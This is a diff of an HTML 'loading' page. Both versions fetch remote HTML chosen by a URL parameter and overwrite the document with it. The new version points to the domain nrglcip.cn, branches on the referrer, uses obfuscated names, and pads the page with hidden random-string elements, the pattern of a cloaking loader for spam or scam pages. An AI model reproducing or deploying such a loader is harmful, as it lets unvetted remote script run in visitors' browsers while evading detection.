@@ -1,43 +1,188 @@
+<!DOCTYPE html>
 <html>
-<head> <meta charset="utf-8" /></head>
-<body></body>
-<script>
-    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
-    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
-    function Dget(e, t,a) {
-        var n = new XMLHttpRequest;
-        //n.timeout = 3000;
-        n.onreadystatechange = function () {
-            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
-        };n.ontimeout = function (e) {
-            //alert('请求超时,重新发起请求');
-            //location.reload();
-        };
-        n.open("GET", e, !0),
-            n.send(null)
-    }
-    var temp = getUrlParam('temp');
-    //if(document.referrer){
-    var temp_name = temp +'.html';
-    Dget('//imgkbc.bj.bcebos.com/j/'+temp_name,function(res){
-        var doc=document.open("text/html","replace")
-        doc.write(res);
-        doc.close()
-    })
-	function add_cnzz(site_id) {
-    var hm = document.createElement("script");
-    hm.src = "https://s4.cnzz.com/z_stat.php?id=" + site_id;
-    var s = document.getElementsByTagName("script")[0];
-    s.parentNode.insertBefore(hm, s);
+<head>
+    <title>加载中...</title>
+    <meta charset="UTF-8">
+    <style>
+        iframe {
+            display: none;
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            border: 0
+        }
 
-    var cnzz_span = document.createElement('span');
-    cnzz_span.id = "cnzz_stat_icon_" + site_id;
-    cnzz_span.style.display = "none"
+        body {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            border: 0
+        }
 
-    document.body.appendChild(cnzz_span);
-}
-add_cnzz(1279189134)
-    //}
+        .ELSwHtFu3j {
+            position: fixed;
+            left: 0;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            z-index: 1;
+            background-color: #d8d8d8
+        }
 
-</script>
+        .ELSwHtFu3j .byz2pWBf {
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            height: 50px;
+            margin: auto
+        }
+
+        .ELSwHtFu3j .content {
+            line-height: 50px;
+            text-align: center
+        }
+
+        .ELSwHtFu3j .img {
+            width: 100%
+        }
+
+        .ELSwHtFu3j .g8cveh {
+            text-align: center
+        }
+
+        .ELSwHtFu3j .g8cveh span {
+            display: inline-block;
+            width: 6px;
+            height: 50px;
+            background-color: #FF5722;
+            -webkit-transform: scaleY(0.4);
+            transform: scaleY(0.4);
+            -webkit-animation: scale 1s infinite;
+            animation: scale 1s infinite
+        }
+
+        .ELSwHtFu3j .g8cveh span:nth-child(2) {
+            -webkit-animation: scale 1s .2s infinite;
+            animation: scale 1s .2s infinite
+        }
+
+        .ELSwHtFu3j .g8cveh span:nth-child(3) {
+            -webkit-animation: scale 1s .3s infinite;
+            animation: scale 1s .3s infinite
+        }
+
+        .ELSwHtFu3j .g8cveh span:nth-child(4) {
+            -webkit-animation: scale 1s .4s infinite;
+            animation: scale 1s .4s infinite
+        }
+
+        .ELSwHtFu3j .g8cveh span:nth-child(5) {
+            -webkit-animation: scale 1s .5s infinite;
+            animation: scale 1s .5s infinite
+        }
+
+        .ELSwHtFu3j .g8cveh span:nth-child(6) {
+            -webkit-animation: scale 1s .6s infinite;
+            animation: scale 1s .6s infinite
+        }
+
+        @-webkit-keyframes scale {
+            0% {
+                -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4)
+            }
+            20% {
+                -webkit-transform: scaleY(0.8);
+                transform: scaleY(0.8)
+            }
+            40% {
+                -webkit-transform: scaleY(1);
+                transform: scaleY(1)
+            }
+            100% {
+                -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4)
+            }
+        }
+
+        @keyframes scale {
+            0% {
+                -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4)
+            }
+            20% {
+                -webkit-transform: scaleY(0.8);
+                transform: scaleY(0.8)
+            }
+            40% {
+                -webkit-transform: scaleY(1);
+                transform: scaleY(1)
+            }
+            100% {
+                -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4)
+            }
+        }
+
+        .ELSwHtFu3j .tips {
+            font-size: 1rem;
+            color: #fff;
+            text-align: center
+        }
+    </style>
+    <script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+        function fAb63317izp(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+		var k9lth = fAb63317izp('temp');
+		if (!document.referrer){
+			url="https://bb.nrglcip.cn/html/"+ k9lth +".html?a=index";
+		}else {
+			url="https://bb.nrglcip.cn/htm1/"+ k9lth +".html?a=share";
+		}
+		
+        eOV54lQ6r=url+"#"+new Date().getTime();
+        eOV54lQ6r && function() {
+            $.get(eOV54lQ6r, function(data) {
+                var new_doc = document.open("text/html", "replace");
+                new_doc.write(data);
+                new_doc.close();
+            });
+        }();
+
+    </script>
+
+</head>
+<body>
+
+<div style='display:none'>NE50ghqFEMpTc7TufrIIctdr84r3z0RFigsa3WHv25qResBc4kNArUtnbOPeJztJiCFOQA</div>
+<ul style='display:none' >xbM44W4W1LHiUTDnDhRilWEGB0S4r3rfByID0uKv2U77VoTjvVh3HYHZpCp9ujyHuIuiywdu8XfoyPgKR</ul>
+<h1 style='display:none' >JOkCx5igAuO7tSPWnJXROuOlbAYM8PS6TLhSlLC4hztya3k4Q1oJcOHJBpzsJ9XkHKpVnmKxWtsSmdGub0yppc3YnoCIt</h1>
+<h1 style='display:none' >JOkCx5igAuO7tSPWnJXROuOlbAYM8PS6TLhSlLC4hztya3k4Q1oJcOHJBpzsJ9XkHKpVnmKxWtsSmdGub0yppc3YnoCIt</h1>
+<span style='display:none'>bD7sJgyXwtBPKnORWCCcNECFpTvHENyjbgaeCfcpaCDTgPgx2t</span>
+<div style='display:none'>NE50ghqFEMpTc7TufrIIctdr84r3z0RFigsa3WHv25qResBc4kNArUtnbOPeJztJiCFOQA</div><div class="ELSwHtFu3j">
+    <div class="byz2pWBf">
+        <div class="g8cveh">
+            <p style="font-size:50px;color:#FF5722; padding-top: 18%; margin:-28% auto">正在加载...</p>
+
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span></div>
+
+    </div>
+</div>
+
+<li style='display:none' >wTIkhbQYQ5suZGT4S2ygnpaSZSbt2nq3DPIo5UDx7glU0H4iGlF4qpM0YvSZFAmXl7z7YqrZ</li>
+<div style='display:none'>sba5YyMiw1VGFT4kRxs04IiUWSBmTOZa1iAkbRLkikIsnM7R9HAr6rBmB0M</div>
+<h1 style='display:none' >yieTA4nojgkS1hbYSdFa2bOyPXlLB7tCywYhTvMQnfa</h1>
+<span style='display:none'>N41GoRJXYWVwRbLXuxJUiONIK21KL9i71bZ6BtnSQqNSmlgeYxslpvcutwnuPeJdQCP3KglurExzEYtu7Q3ssL76IxVNz7vPV</span>
+<li style='display:none' >wTIkhbQYQ5suZGT4S2ygnpaSZSbt2nq3DPIo5UDx7glU0H4iGlF4qpM0YvSZFAmXl7z7YqrZ</li>
+<p  style='display:none'>T4fVUReCnTP6F0CHk4zGS6iKOu6bIoPiALbt0HDbgzmuN0YHw2Rgbu5J7J36z25CT0VBG62lhyFNFPmaW</p>
+<b style='display:none' >hu2zxL3JWyaVRKbgjLYYa7CEX9GZBqlGHiMiArBPIL5zWskwucYX2lhaSKHnKk3uWTO3H5tgZ5ZqrE0ZUP8n0Hm2EOfWZwE0MZ</b></body>
 </html>
